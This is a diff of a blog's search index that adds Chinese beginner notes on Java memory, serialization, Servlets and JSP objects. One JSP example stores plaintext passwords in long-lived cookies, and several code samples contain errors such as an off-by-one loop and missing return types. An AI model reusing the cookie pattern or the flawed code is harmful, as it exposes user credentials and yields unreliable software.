+    <content type="text"><![CDATA[0x01 前言要想java安全学的好，内存划分必不可少，对于分析java程序，了解内存的划分和运行机制对于安全研究是必不可少的一项技能，最近学习了一下，写了些笔记，分享一下。 0x02 Java内存划分 成员 作用 方法区 存放所有的class和static变量 栈 每执行一个函数，就创建一个栈桢，并加入栈中（每个函数从调用到执行结束，其实是对应一个栈桢的入栈和出栈） 本地方法区 为native方法服务 堆 被所有线程共享的一块区域，在虚拟机启动时就被创建了，所有的对象实例和数组都是在堆上分配的 程序计数器 当前线程所执行的字节码的行号指示器 0x03 栈例如写一段代码12345678910111213141516public class Person &#123; static void say(String name) &#123; System.out.println(&quot;My name is &quot; + name); &#125; public static void main(String[] args) &#123; String name = &quot;pino&quot;; say(name); &#125;&#125; 以这段代码为例子，当程序运行的时候，首先会运行main函数，那么就会先生成一个main函数的栈桢，然后存放栈中，而栈桢中存放的是成员变量，也就是这里的name属性了，接着，调用了say函数，那么就会相应的生成一个say函数的栈桢。当say函数执行结束后，say的栈桢就会从栈中出栈，然后main函数运行结束，main的栈桢也出栈，最后栈中就空了，整个程序就结束了。 以上就是栈的运行机制了，总结一下就是成员变量放在自己的栈桢中，执行函数时把栈桢入栈，方法执行完毕后，该方法的栈桢出栈。 0x04 堆堆的话，就像之前说的，所有的对象实例和数组都在堆上分配。简单的理解就是所有new创建的对象实例都是在堆上进行分配的，因为数组也是new出来的。 例如如下代码123456789public class Person &#123; public static void main(String[] args) &#123; int ages[] = new int[] &#123;1,2,3&#125;; &#125;&#125; 我这里创建了一个数组，那么具体的过程如下： 程序运行，调用main函数 生成main函数的栈桢，并存放到栈中 main的栈桢有一个成员变量ages int[] ages 是声明一个int类型的数组 new int[]{1,2,3} 是在堆中初始化数组（分配一块空间） 把初始化的地址赋值给ages 栈桢中的ages成员会指向堆中的那块空间 是的你没看错，赋值的是一个地址，不信你看 我把ages打印出来，结果确实是一个类似地址的字符串 那么具体点就是堆中存放这对象实例的地址，以及他的成员的值，比如这里它会存放： 位置0的值是1位置1的值是2位置2的值是3 当然，如果说有很多数组变量，那么内存空间可能会紧张，就会变成垃圾，等着垃圾回收器来回收。 0x05 垃圾回收机制Java是自动垃圾回收机制，不像c语言，需要自己来回收。当JVM发现内存不够时，会自动清理无用对象 JVM的垃圾回收机制中，判断一个对象是否死亡，并不是根据是否还有对象对其引用，而是通过可达性分析。对象之间的引用可以抽象为树形结构，通过树根作为起点，从这些树根往下搜索，搜索走过的链称为引用链，当一个对象到GC ROOTs没有任何引用链相连，则证明这个对象是不可用的，该对象会被判定为可回收的对象。 0x06 总结创建一个对象时，比如Person，方法区存放的是Person对象的字节码（Person.class）以及static等常量。new的时候，堆中分配一块区域，有对象的地址和对象属性的值栈中存放方法的栈桢，该栈桢存放成员变量，其值为实例化的对象的地址]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>Java安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java序列化与反序列化基础]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%2F</url>
+    <content type="text"><![CDATA[0x01 概述什么是序列化，简单的来说，序列化就是为了保存对象的状态；而反序列化就是把保存的对象状态再读出来。使用场景： 当想把内存中的对象状态保存到一个文件或者数据库中的时候 当想用套接字在网络上传送对象的时候 当想通过RMI传输对象的时候 0x02 Java支持序列化种类Java支持的序列化有三种 自定义实现Serializable接口的类 Java的基本类型 Java自带的实现了Serializable接口的类 下面用程序展示着三种情况 支持自定义实现Serializable接口的类：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class SerialTest1 &#123; private static final String TMP_FILE = &quot;.serialtest1.txt&quot;; public static void main (String args[]) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(TMP_FILE)); Box box = new Box(&quot;desk&quot;, 80, 48); out.writeObject(box); System.out.println(&quot;testWrite box:&quot; + box); out.close(); &#125;catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream(new FileInputStream(TMP_FILE)); Box box = (Box)in.readObject(); System.out.println(&quot;testRead box:&quot; + box); in.close(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125;class Box implements Serializable &#123; private int width; private int height; private String name; public Box (String name, int width, int height) &#123; this.name = name; this.height = height; this.width = width; &#125; public String toString () &#123; return &quot;[&quot; + name + &quot;: (&quot; + width + &quot;, &quot; + height + &quot;) ]&quot;; &#125;&#125; 运行结果： 支持java的基本类型和自带的实现了Serializable接口的类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; import java.util.Map;import java.util.HashMap;import java.util.Iterator; public class SerialTest2 &#123; private static final String TMP_FILE = &quot;.serialabletest2.txt&quot;; public static void main(String[] args) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream( new FileOutputStream(TMP_FILE)); out.writeBoolean(true); out.writeByte((byte)65); out.writeChar(&apos;a&apos;); out.writeInt(20131015); out.writeFloat(3.14F); out.writeDouble(1.414D); HashMap map = new HashMap(); map.put(&quot;one&quot;, &quot;red&quot;); map.put(&quot;two&quot;, &quot;green&quot;); map.put(&quot;three&quot;, &quot;blue&quot;); out.writeObject(map); out.close(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream( new FileInputStream(TMP_FILE)); System.out.printf(&quot;boolean:%b\n&quot; , in.readBoolean()); System.out.printf(&quot;byte:%d\n&quot; , (in.readByte()&amp;0xff)); System.out.printf(&quot;char:%c\n&quot; , in.readChar()); System.out.printf(&quot;int:%d\n&quot; , in.readInt()); System.out.printf(&quot;float:%f\n&quot; , in.readFloat()); System.out.printf(&quot;double:%f\n&quot; , in.readDouble()); HashMap map = (HashMap) in.readObject(); Iterator iter = map.entrySet().iterator(); while (iter.hasNext()) &#123; Map.Entry entry = (Map.Entry)iter.next(); System.out.printf(&quot;%-6s -- %s\n&quot; , entry.getKey(), entry.getValue()); &#125; in.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行结果 这里HashMap是java.util包中定义的类，它属于java自带的实现Serializable接口的类，它的接口声明如下：12public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable &#123;&#125; 0x03 序列化中的特例从上面说得，我们知道序列化/反序列化，只支持保存/恢复对象状态，即仅支持保存/恢复类的成员变量，但不支持保存类的成员方法，但是，序列化是不是对类的所有的成员变量的状态都能保存呢？答案是否定的。 序列化对static和transient变量，是不会自动进行状态保存的。transient的作用就是，用transient声明的变量，不会被自动序列化。 对于Socket, Thread类，不支持序列化。若实现序列化的接口中，有Thread成员；在对该类进行序列化操作时，编译会出错！ static与transient首先说一下序列化对static和transient的处理吧，我们将之前的代码中Box类修改一下123456789101112131415class Box implements Serializable &#123; private static int width; private transient int height; private String name; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 将成员变量的类型修改为static和transient，运行一下，结果： 前面说得，序列化不对static和transient变量进行状态保存的。因此，testWrite()中保存Box对象时，不 会保存width和height的值。但是为什么testRead()读出来的Box对象中width=80，而height=0呢？ 对于height，因为Box对象中height是int类型，而int类型默认是0，因此height为0. 而对于width，它是static类型，而static类型意味着所有Box对象都公用一个heith值，而在testWrite()中，我们已经将其初始化为80，因此，我们通过序列化读出来width也是80. 那么，如果我们想要保存static或transient变量，也是可以的，只要重写两个方法writeObject()和readObject()即可。还是Box类123456789101112131415161718192021222324252627class Box implements Serializable &#123; private static int width; private transient int height; private String name; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; private void writeObject(ObjectOutputStream out) throws IOException&#123; out.defaultWriteObject(); out.writeInt(height); out.writeInt(width); &#125; private void readObject(ObjectInputStream in) throws IOException,ClassNotFoundException&#123; in.defaultReadObject(); height = in.readInt(); width = in.readInt(); &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 在writeObject()方法中，out.defaultWriteObject()是使定制的writeObject()方法可以利用自动序列化中内置的逻辑 在readObject()方法中，in.defaultReadObject()也是使定制的readObject()方法可以利用自动序列化中内置的逻辑。 Socket、Thread类 在Box类中添加123456private Thread thread = new Thread() &#123; public void run() &#123; System.out.println(&quot;Serializable thread&quot;); &#125;&#125;; 运行发现，直接编译报错！ 事实证明，不能对Thread进行序列化，若希望程序能便宜通过，我们对Thread变量添加static或transient修饰符即可。 0x04 完全定制序列化过程Externalizable如果一个类要完全负责自己的序列化，则实现Externalizable接口，而不是Serializable接口。 Externalizable接口定义包括两个方法writeExternal()与readExternal()。需要注意的是：声明类实现Externalizable接口会有重大的安全风险。writeExternal()与readExternal()方法声明为public，恶意类可以用这些方法读取和写入对象数据。如果对象包含敏感信息，则要格外小心。实例：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.ObjectOutput; import java.io.ObjectInput; import java.io.Serializable; import java.io.Externalizable; import java.io.IOException; import java.lang.ClassNotFoundException; public class ExternalizableTest1 &#123; private static final String TMP_FILE = &quot;.externalizabletest1.txt&quot;; public static void main(String[] args) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream( new FileOutputStream(TMP_FILE)); Box box = new Box(&quot;desk&quot;, 80, 48); out.writeObject(box); System.out.println(&quot;testWrite box: &quot; + box); out.close(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream( new FileInputStream(TMP_FILE)); Box box = (Box) in.readObject(); System.out.println(&quot;testRead box: &quot; + box); in.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125;class Box implements Externalizable &#123; private int width; private int height; private String name; public Box() &#123; &#125; public Box(String name, int width, int height) &#123; this.name = name; this.width = width; this.height = height; &#125; public void writeExternal(ObjectOutput out) throws IOException &#123; &#125; public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123; &#125; public String toString() &#123; return &quot;[&quot;+name+&quot;: (&quot;+width+&quot;, &quot;+height+&quot;) ]&quot;; &#125;&#125; 0x05 参考文献http://www.cnblogs.com/skywang12345/p/io_06.html]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>Java安全</tag>
+        <tag>反序列化</tag>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java访问修饰符归纳]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E8%AE%BF%E9%97%AE%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%BD%92%E7%BA%B3%2F</url>
+    <content type="text"><![CDATA[private ——— 仅对本类可见 protected ——— 对本包和子类可见 public ——— 对所有类可见 默认 ——— 对本包可见，继承也不行]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java中的static]]></title>
+    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84static%2F</url>
+    <content type="text"><![CDATA[0x01 static的作用static代表它修饰的那个东西是属于整个类的。 0x02 static的特点 static修饰的内容，是随着类的加载而加载。当JVM把字节码加载到虚拟机当中，static它修饰的成员会自动地加载到内存中（方法区） static修饰的内容，优先于对象存在 static修饰的内容，被该类对象所共享 static修饰的内容，可以通过类名来访问 static修饰的方法，在编译的时候就确定了其类型，所以用类来调用而不是对象来调用。 0x03 类中的成员类中的成员分为类成员和实例成员 类成员就是使用static修饰的成员实例成员就是不使用static修饰的成员]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Servlet]]></title>
+    <url>%2F2018%2F05%2F30%2FServlet%2F</url>
+    <content type="text"><![CDATA[0x01 概述Jsp的前身就是Servlet。Servlet是在服务器上运行的小程序，它就是一个java类，并且可以通过请求-响应编程模型来访问的这个驻留在服务器内存里的serlvet程序。 0x02 Tomcat容器等级Tomcat容器分为四个等级，Servlet的容器管理Context容器，一个Context对应一个Web工程。 0x03 编写Servlet 继承HttpServlet 重写doGet()或者doPost()方法 在web.xml中注册Servlet Servlet编写1234567891011121314151617181920212223242526import javax.servlet.http.HttpServletimport java.io.PrintWriterpublic class HelloServlet extends HttpServlet &#123; protected void doGet (HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;Get request&quot;); resp.setContentType(&quot;text/html&quot;); PrintWriter out = resp.getWriter(); out.println(&quot;&lt;strong&gt;HelloServlet!&lt;/strong&gt;&lt;br&gt;&quot;); out.flush(); out.close(); &#125; protected void doPost (HttpServletRequest, req, HttpServletResponse resp) throws ServletException, IOException &#123; System.out.println(&quot;Post request&quot;); resp.setContentType(&quot;text/html&quot;); PrintWriter out = resp.getWriter(); out.println(&quot;&lt;strong&gt;HelloServlet&lt;/strong&gt;&quot;); out.flush(); out.close(); &#125;&#125; 配置web.xml12345678&lt;servlet&gt; &lt;servlet-name&gt;HelloServlet&lt;servlet-name&gt; &lt;servlet-class&gt;servlet.HelloServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/servlet/HelloServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 在上面web.xml里，标签中的servlet.HelloServlet是我们编写的Servlet中的类名 中的url-pattern是要访问的url路径 0x04 Servlet与九大内置对象12345678910内置对象 怎样获得out resp.getWriter()request service方法的req参数response service方法的resp参数session req.getSession()函数application getServletContext()函数exception Throwablepage thispageContext PageContext Config getServletConfig()函数 0x05 Servlet执行顺序 构造方法 init初始化方法 service方法 –&gt; doGet()和doPost()方法 destroy方法]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Jsp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Windows下命令行运行java程序]]></title>
+    <url>%2F2018%2F05%2F30%2FWindows%E4%B8%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8Cjava%E7%A8%8B%E5%BA%8F%2F</url>
+    <content type="text"><![CDATA[0x01 准备在运行java程序之前需要将环境变量配好，检查CLASSPATH和JAVA_HOME时候都弄好了 0x02 运行编译java文件1javac xxx.java xxx为java文件中的类名称，一定要相同才行，否则会报错这时，当前目录下会产生一个xxx.class文件 运行.class文件1java xxx 这里不用在后面加.class运行成功~]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[jsp学习笔记]]></title>
+    <url>%2F2018%2F05%2F30%2Fjsp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
+    <content type="text"><![CDATA[0x01 jsp的指令标签&lt;%@page %&gt; 定义网页依赖属性，比如脚本语言、error页面、缓存需求等等。&lt;%@include%&gt; 包含其他文件。包含的文件就好像是该JSP文件的一部分，会被同时编译执行。&lt;%@taglib%&gt; 引入标签库的定义。 0x02 jsp的动作标签与存取javabean有关（3只）jsp:usebean 加载一个将在JSP页面中使用的JavaBean。jsp:setProperty 设置已经实例化的Bean对象的属性第一种：12345用法：&lt;jsp:usebean id=&quot;myName&quot; /&gt;.....&lt;jsp:setProperty name=&quot;myName&quot; property=&quot;someProperty&quot; value=&quot;someValue&quot;/&gt;不管jsp:useBean是找到了一个现有的Bean，还是新创建了一个Bean实例，jsp:setProperty都会执行 第二种：12345用法：&lt;jsp:usebean id=&quot;myName&quot;&gt;&lt;jsp:setProperty name=&quot;myName&quot; property=&quot;someProperty&quot; value=&quot;someValue .../&gt;&lt;/jsp:usebean&gt;jsp:setProperty只有在新建Bean实例时才会执行，如果是使用现有实例则不执行jsp:setProperty。 name和property是必须的，前者选择要用哪个bean，一般是usebean的id属性，后者表示是要设置的变量名。jsp:getProperty获取Bean的属性的值并将之转化为一个字符串，将其插入到页面中1&lt;jsp:getProperty name=&quot;someName&quot; property=&quot;someProperty&quot;&gt; 基本动作元素（6只）jsp:include 包含静态和动态的文件。 插入文件的时间是在页面被请求的时候。1&lt;jsp:include file=&quot;xx.jsp&quot; flush=&quot;true&quot;&gt; jsp:forward 把请求转到另外的页面。1&lt;jsp:forward page=&quot;相对 URL 地址&quot; /&gt; jsp:plugin用来在JSP中嵌入Java插件123456789101112131415&lt;jsp:plugin&gt; type=&quot;bean | applet&quot; name=&quot;Applet名称&quot; code=&quot;java类名&quot; codebase=&quot;Java类所在目录&quot; align=&quot;对齐方式&quot; height=&quot;高度&quot; width=&quot;宽度&quot; hspace=&quot;水平间距&quot; vspace=&quot;垂直间距&quot; archive=&quot;预先加载的类列表&quot; jreversion=&quot;JRE版本&quot; iepluginurl=&quot;URL&quot; nspluginurl=&quot;URL&quot; &lt;/jsp:plugin&gt; jsp:paramjsp:params12345&lt;jsp:plugin&gt; &lt;jsp:params&gt; &lt;jsp:param name=&quot;参数名&quot; value=&quot;参数值&quot; /&gt; &lt;/jsp:params&gt; &lt;/jsp:plugin&gt; jsp:fallback用来指定当浏览器不支持或者无法启动Bean或Applet时，在页面上打印输出错误提示信息。12345&lt;jsp:plugin&gt; &lt;jsp:fallback&gt; 错误信息 &lt;/jsp:fallback&gt; &lt;/jsp:plugin&gt; 与JSP Document相关（6只）jsp:rootjsp:declarationjsp:scriptletjsp:expressionjsp:textjsp:output 与动态生成XML标签有关（3只）jsp:attributejsp:bodyjsp:element 与Tag File有关（2只）jsp:invokejsp:dobody #0x03 jsp内置对象 request对象来自客户端的请求，经过servlet容器处理后，由request对象进行封装 javax.servlet.http.HttpServletRequest类的实例1234567891011121314request.getParameter(key) 获取表单提交的相应key的值 （&lt;% String name = request.getParameter(&quot;name&quot;);&gt;）request.getParameterValue(key) 获取表单提交的一组数据 （&lt;% String[] names = request.getParameterValue(&quot;names&quot;);&gt;）request.getHeaderNames() 获取http请求头的信息request.setAttribute(key.object) 设置请求对象的属性request.getAttribute(key) 获取请求对象的属性request.setCharacterEncoding(&quot;UTF-8&quot;) 对请求数据重新编码（解决post中文乱码问题，get不行）request.getContentType() 获取请求体的MIME类型request.getProtocol() 获取协议类型和版本类型request.getServerName() 获取服务器主机名request.getServerPort() 获取服务器端口号request.getContentLength() 获取请求文件的长度request.getRemoteAddr() 获取请求体的IP地址（xff不能伪装）request.getRealPath(&quot;request.jsp&quot;) 获取请求文件的绝对路径request.getContextPath() 获取请求的上下文路径 response对象封装了JSP响应，将响应发送回客户端 javax.servlet.http.HttpServletResponse类的实例1234response.setContentType(&quot;text/plain;charset=utf-8&quot;) 设置响应的MIME类型request.getRequestDispatcher(&quot;request.jsp&quot;).forward(request, response) 请求转发response.sendRedirect(&quot;xx.jsp&quot;) 页面跳转，与之前的forward不同，这个是跳转response.setCharaterEncoding(&quot;gbk&quot;) 设置响应的编码 session对象表示一个会话，用来保存用户的信息，以便跟踪用户，存在服务端，直到关闭网站或者注销账户，可以在浏览器浏览器之间切换，共享数据作用域：session javax.servlet.http.HttpSession类的实例1234567session.getid() 获取session的id号，该id号由tomcat自动分配session.isnew() 判断session是否是新建的session.setAttribute(key.object) 往当前会话中设置属性session.getAttribute(key) 从当前会话中得到属性session.removeAttribute(key) 从当前会话中删除一个属性session.setMaxInactiveInterval(1000*60*30) 设置当前会话的失效时间，tomcat默认30分钟session.invalidate() 初始化一个会话，删除会话 cookie对象cookie对象不是jsp的内置对象，需要构造，不过因为跟session很相似，就放在这边说了。123456789101112131415161718Cookie[] cookies = request.getCookie();String getName() 返回cookie的名字String getValue() 返回cookie的值接受CookieCookie[] cookies = request.getCookie();for (int i = 0; i &lt;= cookies.length; i++)&#123; if (&quot;username&quot;.equals(cookies[i].getName())) username = cookies[i].getValue(); if (&quot;password&quot;.equals(cookies[i].getName())) password = cookies[i].getValue();&#125;创建CookieCookie nameCookie = new Cookie(&quot;username&quot;, name);nameCookie.setMaxAge(60*60*24*30); 设置cookie生存周期Cookie pwdCookie = new Cookie(&quot;password&quot;, pwd);pwdCookie.setMaxAge(60*60*24*30);response.addCookie(nameCookie); 添加cookieresponse.addCookie(pwdCookie); application对象用户间数据的共享，全局变量 javax.servlet.ServletContext类的实例，代表着整个jsp页面123456789101112131415161718application.setAttribute(key.object) application.getAttribute(key)application.removeAttribute(key)实例：&lt;%application.setAttribute(&quot;city&quot;, &quot;北京&quot;);application.setAttribute(&quot;postcode&quot;, &quot;10000&quot;);application.setAttribute(&quot;email&quot;, &quot;123@123.com&quot;);%&gt;所在城市：&lt;%= application.getAttribute(&quot;city&quot;)%&gt;&lt;br /&gt;application的属性有：&lt;%Enumeration attributes = applicaiton.getAttributeNames();while(attribute.hasMoreElements()) out.println(attributes.nextElement()+&quot;&amp;nbsp;&amp;nbsp;&quot;);%&gt;&lt;br /&gt;JSP(SERVLET)引擎名以及版本号:&lt;%= application.getServerInfo()%&gt; config对象 javax.servlet.ServletConfig类的实例，这个对象允许开发者访问Servlet或者JSP引擎的初始化参数，比如文件路径等。 page对象 这个对象就是页面实例的引用。它可以被看做是整个JSP页面的代表。page 对象就是this对象的同义词。 page context对象 exception对象 out对象 javax.servlet.jsp.JspWriter 类的实例，用来在response对象中写入内容。作用域：page，也就是说每个page都有一个out对象1234out.print() 输出out.println() 输出后换行out.flush() 刷新输出流out.write() 输出 0x03 javabeansjavabeans就是符合某种特性的java类，减少代码重复 创建javabeans实例放到src的com.po包中：1234567891011121314151617181920212223package com.po;/** * 用户类**/public class Users()&#123; private String username; Private String password; //保留次构造方法 public User()&#123; &#125; public String getUsername()&#123; return username; &#125; public setUsername(String username)&#123; this.username = username; &#125; public String getPassword()&#123; return password; &#125; public setPassword(password)&#123; this.password = password; &#125;&#125; 使用javabeans实例12345678&lt;%@page import=&quot;com.po.Users&quot;%&gt;&lt;%Users user = new Users();user.setUsername(&quot;admin&quot;);user.setPassword(&quot;123456&quot;);%&gt;用户名：&lt;%= user.getUsername()%&gt;密码：&lt;%= user.getPassword()%&gt;]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>Jsp</tag>
+        <tag>Java Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Hello]]></title>
     <url>%2F2018%2F05%2F30%2F1%2F</url>
-    <content type="text"><![CDATA[Hello, This is my new blog - Pin0&apos;s Blog]]></content>
+    <content type="text"><![CDATA[Hello, This is my new blog - Pin0&apos;s Blog 之前一直在简书里写文章的，链接在这里 现在会逐步把简书的文章搬到我的博客里，各位看官要是看的不爽的，可以先收藏哦～]]></content>
       <categories>
         <category>Hello</category>
       </categories>
